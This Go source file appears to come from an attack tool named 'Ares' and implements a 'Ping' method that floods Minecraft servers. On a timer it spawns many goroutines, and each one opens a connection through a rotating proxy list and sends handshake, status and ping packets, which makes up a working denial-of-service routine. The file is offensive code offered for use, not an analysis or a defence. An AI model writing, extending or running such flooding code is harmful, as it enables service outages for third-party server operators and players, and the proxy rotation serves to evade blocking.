package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type Ping struct {
	Config          *core.AttackConfig
	isRunnig        bool
	handshakePacket packet.Packet
}

func (p *Ping) Start() {
	ip, port, err := net.SplitHostPort(p.Config.Host)
	if err != nil {
		fmt.Println(err)
	}
	iport, _ := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
	}
	p.handshakePacket = mcutils.GetHandshakePacket(ip, iport, p.Config.Version, mcutils.Status)
	p.isRunnig = true
	done := make(chan struct{})
	for i := 0; i < p.Config.Loops; i++ {
		p.loop(done)
	}
}

func (p *Ping) loop(done chan struct{}) {
	ticker := time.NewTicker(p.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < p.Config.PerDelay; i++ {
				go p.connect()
			}
		case <-done:
			return
		}
	}
}

func (p *Ping) connect() error {
	conn, err := minecraft.DialMc(p.Config.Host, p.Config.ProxyManager.GetNext())
	if err != nil {
		return err
	}

	conn.WritePacket(p.handshakePacket)
	conn.WritePacket(packet.Marshal(
		0x00,
	))
	conn.WritePacket(packet.Marshal(
		0x01,
		packet.Long(time.Now().Unix()),
	))
	return nil
}

func (p *Ping) Stop() {

}
